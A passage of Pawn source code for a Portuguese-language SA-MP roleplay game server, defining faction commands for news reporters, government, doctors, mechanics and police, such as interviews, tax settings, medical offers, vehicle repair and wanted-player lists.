 	AEntrevistar[playerid] = true;
	    
	SendClientMessageToAll(COLOR_NEWS, "_____________________________________[ Notícias ]_____________________________________");
	SendClientMessageToAll(COLOR_NEWS, "                                ***Rádio SpringVale***");

    return 1;
}

COMMAND:pararnoticias(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_NEWS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	
 	AEntrevistar[playerid] = false;

	SendClientMessageToAll(COLOR_NEWS, "                                ***Rádio SpringVale***");
	SendClientMessageToAll(COLOR_NEWS, "_____________________________________[ Notícias ]_____________________________________");

	return 1;
}


COMMAND:entrevistar(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_NEWS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	
	new giveplayerid, string[128];

	if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/entrevistar <playerid>");
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");

	Entrevista[giveplayerid] = true;
	EntrevistadorID[giveplayerid] = playerid;

	format(string, sizeof(string), "Pediste a %s para começar uma entrevista", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "%s pediu para fazer uma entrevista contigo. (/aceitarentrevista)", GetPlayerNameEx(playerid));
	SendClientMessage(giveplayerid, COLOR_INFO, string);

    return 1;
}

COMMAND:pararentrevista(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_NEWS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	
    foreach(new i : Player)
    {
        // if(!IsPlayerConnected(i)) continue;

		Entrevista[i] = false;
		EntrevistadorID[i] = INVALID_PLAYER_ID;
		ASerEntrevistado[i] = false;
		AEntrevistar[i] = false;
    }
    
    SendClientMessage(playerid, COLOR_CHAT, "[NEWS:] {FFFFFF}Acabaste a entrevista!");
    
	SendClientMessageToAll(COLOR_NEWS, "                                ***Rádio SpringVale***");
	SendClientMessageToAll(COLOR_NEWS, "_____________________________________[ Entrevista ]_____________________________________");

    return 1;
}

COMMAND:ajudagoverno(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_GOVERNO) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");

	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA GOVERNO]: {FFFFFF}/imposto - /fundodesemprego - /precogasolina");

	return 1;
}

COMMAND:precogasolina(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_GOVERNO) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	if(pInfo[playerid][FactionRank] != 1 && pInfo[playerid][FactionRank] != 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Rank inválido");

    new montante, string[128];

    if(sscanf(params, "d", montante)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/precogasolina <preço por litro (valores inteiros)>");
    if(montante <= 1 || montante > 4) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Montante inválido");

	oInfo[0][PrecoAtestarG] = montante;
	GuardarOutros();

	format(string, sizeof(string), "Alteraste o Preço por Litro das Bombas de Gasolina para %d$.", montante);
	SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:fundodesemprego(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_GOVERNO) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	if(pInfo[playerid][FactionRank] != 1 && pInfo[playerid][FactionRank] != 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Rank inválido");

    new montante, string[128];

    if(sscanf(params, "d", montante)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/fundodesemprego <montante>");
    if(montante < 0 || montante > 2000) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Montante inválido");

	oInfo[0][FundoDesemprego] = montante;
	GuardarOutros();

	format(string, sizeof(string), "Alteraste o Fundo de Desemprego para %d$.", montante);
	SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:imposto(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_GOVERNO) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	if(pInfo[playerid][FactionRank] != 1 && pInfo[playerid][FactionRank] != 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Rank inválido");

	new sdialog[512];
	
	format(sdialog, sizeof(sdialog),
	"Nome\tMontante Atual\n\
	Imposto Geral\t$%d\n\
	Imposto Automóvel\t$%d\n\
	Imposto sobre Propriedades\t$%d\n\
	Imposto sobre Negócios\t$%d", oInfo[0][Impostos], oInfo[0][ImpostoCarros], oInfo[0][ImpostoCasas], oInfo[0][ImpostoLojas]);
	
	ShowPlayerDialog(playerid, DIALOG_IMPOSTO_MENU, DIALOG_STYLE_TABLIST_HEADERS, "{FFFF00}IMPOSTOS", sdialog, "Selecionar", "Sair");

    return 1;
}

COMMAND:ajudahospital(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_MEDICOS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");

	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA MéDICOS]: {FFFFFF}/passarreceita - /soro - /consulta - /desentoxicar");

	return 1;
}

COMMAND:desentoxicar(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_MEDICOS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    new giveplayerid, montante, string[128];

    if(sscanf(params, "dd", giveplayerid, montante)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/desentoxicar <playerid> <preço>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
    if(montante <= 0 || montante > 2000) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Montante inválido");
    if(pInfo[giveplayerid][Viciado] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não está viciado!");

	Desentoxicar[giveplayerid] = true;
	PrecoDesentoxicar[giveplayerid] = montante;
	DesentoxicadorID[giveplayerid] = playerid;

	format(string, sizeof(string), "Ofereceste uma desentoxicação ao jogador %s por %d$.", GetPlayerNameEx(giveplayerid), montante);
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O médico %s ofereceu-te uma desentoxicação por %d$. (/aceitardesentoxicacao)", GetPlayerNameEx(playerid), montante);
	SendClientMessage(giveplayerid, COLOR_INFO, string);

    return 1;
}

COMMAND:consulta(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_MEDICOS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    new giveplayerid, montante, string[128];

    if(sscanf(params, "dd", giveplayerid, montante)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/consulta <playerid> <preço>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
    if(montante <= 0 || montante > 2000) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Montante inválido");

	Consulta[giveplayerid] = true;
	PrecoConsulta[giveplayerid] = montante;
	ConsultadorID[giveplayerid] = playerid;

	format(string, sizeof(string), "Ofereceste uma consulta médica ao jogador %s por %d$.", GetPlayerNameEx(giveplayerid), montante);
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O médico %s ofereceu-te uma consulta médica por %d$. (/aceitarconsulta)", GetPlayerNameEx(playerid), montante);
	SendClientMessage(giveplayerid, COLOR_INFO, string);

    return 1;
}

COMMAND:soro(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_MEDICOS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/soro <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

    new Float:x, Float:y, Float:z;
    
    TogglePlayerControllable(playerid, true);

	GetPlayerPos(giveplayerid, x, y, z);
    SetPlayerHealthEx(playerid, 50, 0);
    
    SetPlayerPosEx(giveplayerid, x, y, z);
	
	pInfo[giveplayerid][Morto] = 0;
	pInfo[giveplayerid][MorteX] = 0;
	pInfo[giveplayerid][MorteY] = 0;
	pInfo[giveplayerid][MorteZ] = 0;
	pInfo[giveplayerid][MorteVirtualWorld] = 0;
	pInfo[giveplayerid][MorteInterior] = 0;

    format(string, sizeof(string), "Deste soro ao jogador %s", GetPlayerNameEx(giveplayerid));
    SendClientMessage(playerid, COLOR_INFO, string);
    
    PlayerActionMessage(playerid, 15.0, "aplica soro no paciente.");

    GameTextForPlayer(giveplayerid, "~r~Foste curado", 2000, 3);

    return 1;
}

COMMAND:passarreceita(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_MEDICOS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    new giveplayerid, medicamento, montante, string[128];

    if(sscanf(params, "ddd", giveplayerid, medicamento, montante))
	{
	    SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/passarreceita <playerid> <medicamento> <preço>");
	    SendClientMessage(playerid, COLOR_CHAT, "[Medicamentos]: {FFFFFF}1: Gripe - 2: Infeção Urinária - 3: Dores de Barriga - 4: Ataques de Tosse");
	    
		return 1;
	}

    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
    if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes oferecer uma receita a ti próprio");
    if(medicamento <= 0 || medicamento > 4) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Medicamento inválido");
    if(montante < 0 || montante > 500) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Montante inválido");

	Receita[giveplayerid] = true;
	PrecoReceita[giveplayerid] = montante;
	ReceitadorID[giveplayerid] = playerid;
	Medicamento[giveplayerid] = medicamento;

	format(string, sizeof(string), "Ofereceste uma receita médica ao jogador %s por %d$.", GetPlayerNameEx(giveplayerid), montante);
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O mecânico %s ofereceu-te uma receita médica por %d$. (/aceitarreceita)", GetPlayerNameEx(playerid), montante);
	SendClientMessage(giveplayerid, COLOR_INFO, string);
	
	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "assina a receita médica e entraga-a a");

    return 1;
}

COMMAND:ajudamecanicos(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_MECANICOS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");

	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA MECéNICOS]: {FFFFFF}/carro[reparar/atestar/pintar] - /fazerrevisao - /rebocar");

	return 1;
}

COMMAND:fazerrevisao(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_MECANICOS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    new giveplayerid, montante, string[128];

    if(sscanf(params, "dd", giveplayerid, montante)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/fazerrevisao <playerid> <montante>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
    if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes oferecer uma revisão a ti próprio");
    if(montante <= 0 || montante > 200) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Montante inválido");

	Revisao[giveplayerid] = true;
	PrecoRevisao[giveplayerid] = montante;
	RevisorID[giveplayerid] = playerid;

	format(string, sizeof(string), "Ofereceste uma revisão ao jogador %s por %d$.", GetPlayerNameEx(giveplayerid), montante);
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O mecânico %s ofereceu-te uma revisão por %d$. (/aceitarrevisao)", GetPlayerNameEx(playerid), montante);
	SendClientMessage(giveplayerid, COLOR_INFO, string);

    return 1;
}

COMMAND:rebocar(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_MECANICOS && fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
    
    new car = GetPlayerVehicleID(playerid);
    new model = GetVehicleModel(car);
    
    if(model != 525) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás num reboque");
    
	new Float:pX,Float:pY,Float:pZ;
	GetPlayerPos(playerid,pX,pY,pZ);
	new Float:veX,Float:veY,Float:veZ;
	new Found=0;
	new vid=0;
	while((vid<MAX_CARROS)&&(!Found))
	{
		vid++;
		GetVehiclePos(vid,veX,veY,veZ);
		if ((floatabs(pX-veX)<7.0)&&(floatabs(pY-veY)<7.0)&&(floatabs(pZ-veZ)<7.0)&&(vid!=GetPlayerVehicleID(playerid)))
		{
			Found=1;
			if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
			{
				DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
			}
			else
			{
				AttachTrailerToVehicle(vid,GetPlayerVehicleID(playerid));
				SendClientMessage(playerid, COLOR_INFO, "Carro rebocado com sucesso.");
			}
		}
	}
	if(!Found)
	{
		return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Nenhum carro por perto");
	}
    return 1;
}

COMMAND:carroatestar(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_MECANICOS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    new giveplayerid, montante, string[128];

    if(sscanf(params, "dd", giveplayerid, montante)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/carroatestar <playerid> <montante>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
    if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes oferecer um atesto a ti próprio");
    if(montante <= 0 || montante > 200) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Montante inválido");

	Atestar[giveplayerid] = true;
	PrecoAtestar[giveplayerid] = montante;
	AtestadorID[giveplayerid] = playerid;

	format(string, sizeof(string), "Ofereceste um atesto de depésito ao jogador %s por %d$.", GetPlayerNameEx(giveplayerid), montante);
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O mecânico %s ofereceu-te um atestamento de depésito por %d$. (/aceitaratesto)", GetPlayerNameEx(playerid), montante);
	SendClientMessage(giveplayerid, COLOR_INFO, string);

    return 1;
}

COMMAND:carropintar(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_MECANICOS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    new giveplayerid, montante, cor1, cor2, string[128];

    if(sscanf(params, "dddd", giveplayerid, montante, cor1, cor2)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/carropintar <playerid> <montante> <cor1> <cor2>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
    if(montante <= 0 || montante > 6000) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Montante inválido");
    if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes oferecer uma pintura a ti próprio");
    if(cor1 < 0 || cor2 < 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Cor inválida");

	Pintura[giveplayerid] = true;
	PrecoPintura[giveplayerid] = montante;
	PintorID[giveplayerid] = playerid;
	Cor1[giveplayerid] = cor1;
	Cor2[giveplayerid] = cor2;

	format(string, sizeof(string), "Ofereceste uma pintura ao jogador %s por %d$. (Cor 1: %d) (Cor 2: %d)", GetPlayerNameEx(giveplayerid), montante, cor1, cor2);
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O mecânico %s ofereceu-te uma pintura por %d$. (Cor 1:%d) (Cor 2: %d) (/aceitarpintura)", GetPlayerNameEx(playerid), montante, cor1, cor2);
	SendClientMessage(giveplayerid, COLOR_INFO, string);

    return 1;
}

COMMAND:carroreparar(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_MECANICOS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    new giveplayerid, montante, string[128];

    if(sscanf(params, "dd", giveplayerid, montante)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/carroreparar <playerid> <montante>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
    if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes oferecer uma reparação a ti próprio");
    if(montante <= 0 || montante > 6000) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Montante inválido");

	Reparacao[giveplayerid] = true;
	PrecoReparacao[giveplayerid] = montante;
	ReparadorID[giveplayerid] = playerid;

	format(string, sizeof(string), "Ofereceste uma reparação ao jogador %s por %d$.", GetPlayerNameEx(giveplayerid), montante);
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O mecânico %s ofereceu-te uma reparação por %d$. (/aceitarreparacao)", GetPlayerNameEx(playerid), montante);
	SendClientMessage(giveplayerid, COLOR_INFO, string);

    return 1;
}

COMMAND:ajudapolicia(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	
	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA POLÍCIA]: {FFFFFF}/algemar - /desalgemar - /revistar - /apreender - /multar - /puxar - /prender");
	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA POLÍCIA]: {FFFFFF}/colocarbarreira - /retirarbarreira - /retirartodasbarreiras - /rebocar - /portapsp - /garagempsp");
	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA POLÍCIA]: {FFFFFF}/sirene - /apreendercarro - /desapreendercarro - /testebalao - /checkmatricula");
	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA POLÍCIA]: {FFFFFF}/suspeitar - /procurados - /mostrardistintivo - /verregisto");

	return 1;
}

COMMAND:verregisto(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/verregisto <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");

	format(string, sizeof(string), "________________________[Registo de  %s]________________________", GetPlayerNameEx(giveplayerid));

	SendClientMessage(playerid, COLOR_ORANGE, string);

	format(string, sizeof(string), "Multas: %d", pInfo[playerid][Multas]);
	SendClientMessage(playerid, COLOR_ORANGE, string);
	format(string, sizeof(string), "Vezes preso: %d", pInfo[playerid][VezesPreso]);
	SendClientMessage(playerid, COLOR_ORANGE, string);
	format(string, sizeof(string), "Vezes suspeito: %d", pInfo[playerid][VezesSuspeito]);
	SendClientMessage(playerid, COLOR_ORANGE, string);

	SendClientMessage(playerid, COLOR_ORANGE, "____________________________________________________________________");
	
	PlayerActionMessage(playerid, 15.0, "procura registos no seu PDA.");

    return 1;
}

COMMAND:mostrardistintivo(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/mostrardistintivo <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");

	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "mostra o distintivo a");

	format(string, sizeof(string), "Mostraste o teu distintivo ao jogador %s", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_ORANGE, string);
	
	SendClientMessage(giveplayerid, COLOR_ORANGE, "________________________________________________________");
	
	format(string, sizeof(string), "Nome: {FFFFFF}%s", GetPlayerNameEx(playerid));
	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
	format(string, sizeof(string), "Número do distintivo: {FFFFFF}%d", pInfo[playerid][UID]);
	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
	
	SendClientMessage(giveplayerid, COLOR_ORANGE, "________________________________________________________");

    return 1;
}

COMMAND:procurados(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    new string[128], found = 0;

    foreach(new i : Player)
    {
        if(pInfo[i][Suspeito] == 0) continue;
        
		format(string, sizeof(string), "[PROCURADOS]: {FFFFFF}%s (ID:%d)", GetPlayerNameEx(i), i);
		SendClientMessage(playerid, COLOR_ORANGE, string);
		
		found = 1;
    }
    
    if(found == 0) return SendClientMessage(playerid, COLOR_ORANGE, "[PROCURADOS:] {FFFFFF}Nenhum suspeito encontrado");

    return 1;
}

COMMAND:suspeitar(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/suspeitar <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    
    if(pInfo[giveplayerid][Suspeito] == 0)
    {
	    pInfo[giveplayerid][Suspeito] = 1;

		format(string, sizeof(string), "O jogador %s é agora suspeito", GetPlayerNameEx(giveplayerid));
		SendClientMessage(playerid, COLOR_ORANGE, string);
    }
    else
    {
	    pInfo[giveplayerid][Suspeito] = 0;

		format(string, sizeof(string), "O jogador %s já não é mais suspeito", GetPlayerNameEx(giveplayerid));
		SendClientMessage(playerid, COLOR_ORANGE, string);
    }

    return 1;
}

COMMAND:checkmatricula(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	
    new matricula[9], string[128], bool:found = false;

    if(sscanf(params, "s[9]", matricula)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/checkmatricula <matrícula>");
    if(strlen(matricula) != 8) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tamanho da matrícula inválida");
    
    for(new c = 0; c < MAX_CARROS; c++)
    {
    	if(c == 0) continue;
    	
		if(strfind(cInfo[c][Matricula], matricula, true) != -1)
